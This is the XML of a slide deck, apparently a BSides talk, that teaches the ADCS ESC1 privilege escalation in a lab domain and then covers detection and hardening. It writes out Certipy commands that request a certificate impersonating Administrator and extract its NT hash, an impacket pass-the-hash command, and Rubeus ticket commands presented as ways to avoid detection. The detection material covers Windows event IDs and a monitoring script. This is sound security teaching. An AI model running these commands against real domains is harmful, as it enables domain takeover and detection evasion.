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9" r:id="rId3"/>
    <p:sldId id="260" r:id="rId4"/>
    <p:sldId id="261" r:id="rId5"/>
    <p:sldId id="283" r:id="rId6"/>
    <p:sldId id="262" r:id="rId7"/>
    <p:sldId id="263" r:id="rId8"/>
    <p:sldId id="264" r:id="rId9"/>
    <p:sldId id="265" r:id="rId10"/>
    <p:sldId id="266" r:id="rId11"/>
    <p:sldId id="267" r:id="rId12"/>
    <p:sldId id="284" r:id="rId13"/>
    <p:sldId id="268" r:id="rId14"/>
    <p:sldId id="269" r:id="rId15"/>
    <p:sldId id="28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5" r:id="rId25"/>
    <p:sldId id="279" r:id="rId26"/>
    <p:sldId id="280" r:id="rId27"/>
    <p:sldId id="287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128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0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E642-2FB6-9980-3D0A-3333B46A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B5C17-B72C-B3F8-35DE-A92FE9ABA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EFCCB-D4CF-C7EB-E6A8-BA6ED6B2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CC8CB-38C4-BE64-FC52-435594A57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85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3FD3-9457-B24D-42BC-9790621C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E2E66-933A-A073-41BD-B375D08EF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C7317-20EA-C8B4-C06F-581E323E3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4E56C-6FA7-0FEA-7DC8-80B06BA2A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46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227D-B735-B6DC-674B-59A272E6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5E73D-A107-49B1-2CB0-458149400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7CB3C-A9E8-DFAC-1A87-389F025C6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1E0F5-D7D9-4611-B5C8-66B6DC94D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67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3042-9058-D747-6DC9-CF1FD4EB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7415B-6BDE-D1FD-2D4F-D78EC0016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9E88A-8561-2EF8-5773-CB2828F2E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3B766-D20E-F2EE-E23C-3E79A7D65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000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9C8BA-C4C6-046B-9829-D758B904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302BA-F685-2396-0BB2-6D9ED8214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72E0E-3DCF-BB1C-A30A-4B6ADFA44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83D87-F680-7EB9-EFF9-04C3269F6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798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ADCS Template Attack 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Privilege </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="22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Path · Detection · OPSEC Alternatives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Introduction: What is ADCS?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549859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Certificate Services (ADCS) manages digital certificate issuance in Windows environments — enabling secure logins, encrypted communications, and device authentication.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client certificate issuance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and smart card logon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via AD integration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templates → privilege escalation. Overly permissive ACLs, outdated configs, and improper subject name settings create the "ESC" vulnerability family.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A6C86-27AD-0C4B-55DC-259A23E23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41" y="1145798"/>
            <a:ext cx="2476846" cy="1790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Certificates: Subject &amp; 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3152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field identifies who the certificate is for. A SAN (Subject Alternative Name) allows one certificate to cover multiple identities.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01168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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 0" descr="/home/claude/docx_extracted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00200"/>
            <a:ext cx="4434840" cy="30815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00600" y="1325880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4800600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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 1" descr="/home/claude/docx_extracted/wor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19125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Certificates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leverages the same Subject/SAN model. A user certificate's subject reflects the user's location in AD. The receiving service reads this to grant appropriate access.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="/home/claude/docx_extracted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6" y="1233116"/>
            <a:ext cx="435864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" y="484632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domain: bsides.yqr  ·  Subject: low-priv user bsidesusr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CCF746-3558-7838-CD1A-4170B73EA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68" y="1402425"/>
            <a:ext cx="3505689" cy="2991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924A2-0BCF-D37A-2F21-4509EE63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EE5BB2-7EBE-FD61-1457-1F056D6FD366}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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CD04BB-8975-7C1C-D2E5-0B5B4D614D91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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Certificate Templates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1CD081-FFBA-5CA7-896B-71E3118348CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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60468-95A7-A7AC-6690-6C19764D73AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201167" y="730204"/>
            <a:ext cx="539124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Certificate Templates are outlines of what certificates can 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User authentication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Device authentication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Web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Code signing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Templates have permissions for who can edit and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A certificate for a web server will not work for code signing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The main takeaway for an attacker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What is the certificate enabled to do?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Who can attain a certificate template?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</a:rPr>
              <a:t>This introduces vulnerabilities into the configuration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/home/claude/docx_extracted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684" y="840850"/>
            <a:ext cx="3130887" cy="377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4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ESC1: Vulnerable Template Configuration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conditions must be present for ESC1 to be exploitable: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285292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2852928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Certificate Auth Purpose</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/home/claude/docx_extracted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08760"/>
            <a:ext cx="2651760" cy="1773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2976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is usable for authentication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72968" y="1115568"/>
            <a:ext cx="285292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3172968" y="1115568"/>
            <a:ext cx="2852928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3246120" y="1143000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Low-Priv Enrollment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 1" descr="/home/claude/docx_extracted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32" y="1508760"/>
            <a:ext cx="2514600" cy="2560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42976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Users / Domain Computers can request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44768" y="1115568"/>
            <a:ext cx="285292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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="1115568"/>
            <a:ext cx="2852928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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1143000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Enrollee Supplies SAN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 2" descr="/home/claude/docx_extracted/word/media/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508760"/>
            <a:ext cx="2651760" cy="941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42976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Requestor controls the Subject Alternative Name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Path: Discovery with Certipy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as low-privileged domain user bsidesusr — enumerate all certificate templates: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8732520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8586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certipy find -u &lt;username&gt;@&lt;domain&gt;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554480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01168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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 0" descr="/home/claude/docx_extracted/word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828800"/>
            <a:ext cx="7067702" cy="25648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" y="4892040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Discovery: Template Details (Corp-LaptopAuth)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docx_extracted/word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777240"/>
            <a:ext cx="4334256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Requesting the Certificate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target account's SID, then craft the certificate request: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51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TARGET SID (PowerShell)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 0" descr="/home/claude/docx_extracted/word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98448"/>
            <a:ext cx="4206240" cy="5394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" y="201168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CERTIPY REQ COMMAND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1168" y="2274197"/>
            <a:ext cx="8732520" cy="6858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274320" y="2313432"/>
            <a:ext cx="8586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./certipy req -u bsidesusr@bsides.yqr -target ca01.bsides.yqr -ca bsides-CA01-CA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-template "Corp-LaptopAuth" -upn Administrator@bsides.yqr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-sid S-1-5-21-1073961799-184829090-2506032629-500 -ns 192.168.157.130</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 1" descr="/home/claude/docx_extracted/word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7" y="2999232"/>
            <a:ext cx="5723291" cy="1435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4434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 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Low-privileged user with @domain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127248" y="4434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-target  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server hostname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053328" y="4434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-ca  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certificate name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01168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-template  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template name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127248" y="4636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-upn / -sid  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 to impersonate (placed in SAN)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Privilege Escalation: Reviewing the Certificate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.pfx to confirm the subject (low-priv user) and SAN (Administrator) are correctly set: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873252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8586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pkcs12 -in administrator.pfx -clcerts -nokeys | openssl x509 -noout -text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536192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01168" y="1536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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 0" descr="/home/claude/docx_extracted/word/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810512"/>
            <a:ext cx="4251960" cy="19568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536192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 FIELD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 1" descr="/home/claude/docx_extracted/word/media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810512"/>
            <a:ext cx="4251960" cy="1545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" y="416052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= bsidesusr (requester)  ·  SAN = Administrator (target) ✓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Privilege Escalation: Certipy Auth → Pass-the-Hash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CERTIPY AUTH (retrieve NT hash)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3482372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certipy auth -pfx administrator.pfx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 0" descr="/home/claude/docx_extracted/word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71600"/>
            <a:ext cx="7453050" cy="174984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82880" y="3887173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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="3910033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01168" y="4091940"/>
            <a:ext cx="8732520" cy="7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certipy auth authenticates to the DC and retrieves the Administrator NT hash via PKINIT + U2U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hash can be used with impacket tools: smbclient.py (safe), wmiexec.py, psexec.py (noisy)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OPSEC: smbclient browse is generally safe; wmiexec/psexec will trigger EDR alerts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64179-D8F7-5216-CB4C-0793E088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408D52-5D76-217F-BB0B-DBE040419FD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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A523F1-BDDB-E4ED-4B6E-4EF0344281D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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Privilege Escalation: Certipy Auth → Pass-the-Hash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7B41C43-AC6C-DCC0-7335-FDE0F19A5E35}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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C1EFFFD-3886-9C48-9E6E-29872384A37D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="315468" y="76031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PASS-THE-HASH — impacket smbclient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E770B5A-9D3F-964A-2A4E-5920735E62A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="305449" y="1005839"/>
            <a:ext cx="4785359" cy="667217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4C60E7-3ADE-65A5-6916-904293700750}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="378601" y="1051560"/>
            <a:ext cx="4620701" cy="518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smbclient.py -hashes ":&lt;NT Hash&gt;" Administrator@dc01.bsides.yqr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 1" descr="/home/claude/docx_extracted/word/media/image15.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17CD72DB-C52D-7296-F2B8-A3022E874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49" y="1463039"/>
            <a:ext cx="8806070" cy="200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35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Team Guidance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monitoring · Audit logging · Event detection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Monitoring with Certify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weekly scan for vulnerable templates — no Python required (use Certify.exe):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" y="1260452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Certify-wrapper.ps1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" y="1587260"/>
            <a:ext cx="7743760" cy="14316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74320" y="1684372"/>
            <a:ext cx="8079377" cy="6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$ts = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"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$log = "C:\Logs\Certify-$ts.txt"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"C:\Path\To\Certify.exe" enum-templates --filter-enabled --filter-vulnerable --quiet 2&gt;&amp;1 |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Out-File -FilePath $log -Encoding utf8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" y="3268062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Task (weekly, Sundays 03:00):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" y="3512879"/>
            <a:ext cx="8732520" cy="800326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74320" y="3543192"/>
            <a:ext cx="8586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schtasks /Create /TN "Certify Weekly Enum" /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Certify-wrapper.ps1" /SC WEEKLY /D SUN /ST 03:00 /F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2FBAD-BE27-44B2-06C6-BE269197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FDD6F5-30F1-68AA-CA11-44765647D210}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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23284E-BB61-E726-D4FB-C62FA97E971B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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Monitoring with Certify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1A4CE0-90A9-3F92-AD87-907BDE8BBA7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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0" descr="/home/claude/docx_extracted/word/media/image16.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3132D809-4C21-0756-4904-C8506807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" y="1094692"/>
            <a:ext cx="8373251" cy="39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50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Enabling Certificate Service Audit Logging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772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1024128"/>
            <a:ext cx="4206240" cy="457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" y="1069848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auditpol /set /subcategory:"Certification Services"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/success:enable /failure:enable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" y="1600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POLICY PATH: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847088"/>
            <a:ext cx="4206240" cy="6858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74320" y="1892808"/>
            <a:ext cx="405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Configuration → Policies → Windows Settings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Security Settings → Advanced Audit Policy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Audit Policies → Object Access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Audit Certification Services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" y="34721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EVENTS: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3700732"/>
            <a:ext cx="4206240" cy="98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4886 — Certificate request received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4887 — Certificate issued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Requestor, Subject, SAN fields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SAN principal is higher-priv than requestor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 0" descr="/home/claude/docx_extracted/word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39" y="698348"/>
            <a:ext cx="3945723" cy="4335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4886: Certificate Request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1B5E14-57D6-2341-342F-36272F7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33" y="662940"/>
            <a:ext cx="6916536" cy="44652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4768: PKINIT TGT Request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Pre-Authentication Type 15 or 16 = PKINIT (certificate-based auth). Anomalous for regular user accounts unless smart cards / WHfB are deployed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="/home/claude/docx_extracted/word/media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07008"/>
            <a:ext cx="3136392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44538" y="1207008"/>
            <a:ext cx="1455266" cy="2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3456432" y="1243411"/>
            <a:ext cx="1443372" cy="218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PRE-AUTH TYPE = 16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1772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15/16 = PKINIT. Normal sources: smart cards, Windows Hello for Business, EAP-TLS. Filtering machine accounts reduces false positives.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1AFCA4-7C91-C530-20F1-BFADEF183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140" y="1461488"/>
            <a:ext cx="5496692" cy="29245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4769: U2U Service Ticket — certipy auth Fingerprint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certipy auth issues a U2U (User-to-User) service ticket request after the PKINIT TGT. The U2U bit in Ticket Options is a strong indicator of certipy auth usage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="/home/claude/docx_extracted/word/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13493"/>
            <a:ext cx="3200400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11880" y="1207008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3611880" y="1207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OPTIONS DECODE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 1" descr="/home/claude/docx_extracted/word/media/image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87813"/>
            <a:ext cx="5212080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11879" y="3316613"/>
            <a:ext cx="1126783" cy="313555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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3503187" y="3359992"/>
            <a:ext cx="1362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 28 = ENC-TKT-IN-SKEY (U2U)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 2" descr="/home/claude/docx_extracted/word/media/image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675888"/>
            <a:ext cx="3904488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4645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Options 0x40810018 → bit 28 set (yellow) = U2U flag active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4624: Logon — Pass-the-Hash Indicator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/home/claude/docx_extracted/word/media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07" y="690372"/>
            <a:ext cx="3658376" cy="44690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OPSEC Alternative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Rubeus pass-the-ticket — fewer detection events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OPSEC Path: Rubeus asktgt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certipy auth (which triggers U2U + NTLM), use Rubeus to request a TGT directly from the certificate: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33856"/>
            <a:ext cx="87325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" y="1179576"/>
            <a:ext cx="8586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.\Rubeus.exe asktgt /user:Administrator /certificate:.\administrator.pfx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/domain:bsides.yqr /dc:dc01 /opsec /enctype:aes256 /nowrap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69164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/opsec  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typical Windows encryption patterns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" y="192024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/enctype:aes256  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AES256 (avoids RC4 detection)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214884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/nowrap  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TGT without line breaks — easier to copy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2450592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201168" y="2450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RUBEUS OUTPUT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 0" descr="/home/claude/docx_extracted/word/media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724912"/>
            <a:ext cx="3694176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OPSEC Path: Rubeus Pass-the-Ticket (PTT)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clean session, inject the TGT, then access the DC — no NTLM, no U2U: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69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RUNAS /NETONLY (blank session)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 0" descr="/home/claude/docx_extracted/word/media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" y="1325880"/>
            <a:ext cx="6025283" cy="18658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7" y="317003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INJECT TGT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 2" descr="/home/claude/docx_extracted/word/media/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9" y="3471786"/>
            <a:ext cx="6896209" cy="14904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B8967-0EA4-BC01-EB97-3A5A3BD5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D2D9CF-EE41-6E86-0FC6-44444F83CE97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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6537E7-4337-EAB3-732F-67E02654BFCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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OPSEC Path: Rubeus Pass-the-Ticket (PTT)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876CDA-E34A-50A8-E8BE-3589C1DD3285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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5ED53B-269A-51F9-8A51-36BF3CDD094F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="749808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clean session, inject the TGT, then access the DC — no NTLM, no U2U:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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912C514-4673-D3BC-9A07-7EFDA0CFAA76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="1118847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09B319C-DD9A-5931-56C3-08B0FFE27C1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="1130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VERIFY TGT IN SESSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 3" descr="/home/claude/docx_extracted/word/media/image33.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC6E6D9F-9C6D-0072-3DF5-41F0A7AAB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53312"/>
            <a:ext cx="4268370" cy="2442742"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58977AA1-F263-C77F-DACF-2DF38BF0A64B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4766957" y="1095383"/>
            <a:ext cx="9144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5DFA809-23B6-3EA8-601C-7F878542EECF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4766957" y="110478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ACCESS DC AS ADMIN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Image 4" descr="/home/claude/docx_extracted/word/media/image34.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C4AD07C-36E6-8712-090F-6C167B897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48" y="1438713"/>
            <a:ext cx="4198198" cy="226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38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Rubeus PTT: Event 4624 — Kerberos Instead of NTLM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Rubeus PTT, the logon event on the DC shows Kerberos authentication — indistinguishable from a legitimate admin login.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="/home/claude/docx_extracted/word/media/imag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44" y="1207008"/>
            <a:ext cx="5001768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Last Note: ms-DS-MachineAccountQuota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01168" y="749808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Domain Computers can enroll in the template — regular users can still exploit ESC1 by adding a computer account to the domain (default quota = 10).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248156"/>
            <a:ext cx="1506862" cy="2148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85296" y="1261872"/>
            <a:ext cx="1222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VALUE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 0" descr="/home/claude/docx_extracted/word/media/imag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" y="1508759"/>
            <a:ext cx="7504821" cy="92388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01168" y="2610784"/>
            <a:ext cx="2412636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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="82296" y="2610784"/>
            <a:ext cx="2412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CERTIPY WITH COMPUTER ACCOUNT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Image 2" descr="/home/claude/docx_extracted/word/media/image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95" y="2935739"/>
            <a:ext cx="6719431" cy="17311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A7169-B494-89BA-EB15-EDAD0297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2EE27C-33DD-E73A-8D34-5DDD7BC0A9EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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610A83-9C8B-F587-547E-71DABB44AE5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="109728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&amp; Hardening Summary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F67786-9B92-114F-E493-0F3364B1CDDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="640080"/>
            <a:ext cx="87325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0E313-0E4E-EFE2-CE9A-54E288A8F9B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201168" y="785866"/>
            <a:ext cx="8650224" cy="403302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72DFDD-088A-55B5-BFED-57A7C439FAC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206344" y="824861"/>
            <a:ext cx="8006003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</a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-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aware of enabled certificate templates available in your domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buSzPct val="100000"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F0F6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dirty="0">
              <a:solidFill>
                <a:srgbClr val="F0F6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insecure templates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-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subject can specify SAN ability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-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enrollee permissions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-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manager approval requirement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buSzPct val="100000"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F0F6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detections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US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event codes discussed to identify nefarious certificate request, authentication attempts, and pass-the-hash activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F0F6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b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F0F6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5800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29661" y="32552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https://github.com/wguest-rsol/bsidesyqr-esc1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D8C87E-DFCB-7036-CE6B-B3199E9BC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49" y="2697480"/>
            <a:ext cx="1952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1291</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>178</Paragraphs>
  <Slides>28</Slides>
  <Notes>28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ESC1: ADCS Privilege Escalation</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>PptxGenJS</dc:creator>
  <cp:lastModifiedBy>Wade Guest</cp:lastModifiedBy>
  <cp:revision>14</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-16T23:05:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-18T20:39:07Z</dcterms:modified>
</cp:coreProperties>
</file>